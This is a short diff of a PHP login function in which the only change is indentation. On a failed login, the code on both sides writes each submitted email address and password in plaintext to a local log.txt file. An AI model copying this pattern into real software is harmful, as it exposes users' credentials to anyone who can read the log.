@@ -92,11 +92,11 @@ function connectUser()
         unset($_SESSION["emailConnect"]);
         return location();
 	}else{
-	  echo "NOK";
-    $file = fopen('log.txt', 'a+');
-    fwrite($file, $_POST["emailConnect"] . " -> " . $_POST["pwdConnect"] . "\r\n");
-    fclose($file);
-    }
+	    echo "NOK";
+        $file = fopen('log.txt', 'a+');
+        fwrite($file, $_POST["emailConnect"] . " -> " . $_POST["pwdConnect"] . "\r\n");
+        fclose($file);
+        }
 }
 
 function getInfo($column){
